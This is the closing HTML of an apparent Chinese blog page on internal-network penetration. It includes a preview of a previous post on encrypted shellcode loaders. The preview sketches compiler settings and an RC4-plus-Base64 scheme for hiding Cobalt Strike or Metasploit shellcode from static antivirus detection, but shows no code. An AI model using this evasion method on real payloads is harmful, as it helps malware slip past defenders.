+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/02/13/cs2/" title="Shellcode 加密加载技术实战"><img class="cover" src="/img/covers/shinchan-cover-02.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post" loading='lazy'><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Shellcode 加密加载技术实战</div></div><div class="info-2"><div class="info-item-1">Visual Studio 开发环境配置在开始 Shellcode 加载器开发前，需要正确配置 Visual Studio 编译环境。以下是关键配置步骤：  配置要点：  关闭 SDL 检查（Security Development Lifecycle），避免编译器对某些 API 的限制 设置字符集为多字节字符集（MBCS），兼容性更好 关闭增量链接，减少可执行文件体积 优化代码生成选项，选择最小体积（&#x2F;O1）或最大速度（&#x2F;O2） 静态链接运行时库（&#x2F;MT），避免依赖外部 DLL   方案一：RC4 + Base64 组合加密这是目前主流的 Shellcode 混淆方案，通过双层加密有效对抗静态特征检测。加密流程为：原始 Shellcode → RC4 加密 → Base64 编码 → C 数组。 加密脚本实现使用 Python 实现 Shellcode 的加密处理，生成可直接嵌入 C++ 代码的数组格式。 核心加密脚本首先从 Cobalt Strike 或 MSF 生成 .bin 格式的原始 Shellcode，然后使用以下脚本进行加密： 1234...</div></div></div></a></nav></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Kenny</span></div><div class="footer_custom_text"><div class="footer-links"><a class="footer-link" href="https://yyyxxx.cc" target="_blank" rel="noopener noreferrer">友情链接：映雪安全</a><a class="footer-link" href="https://qm.qq.com/q/QNgesnj1aU" target="_blank" rel="noopener noreferrer">QQ群：点击加群</a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div></div></body></html>
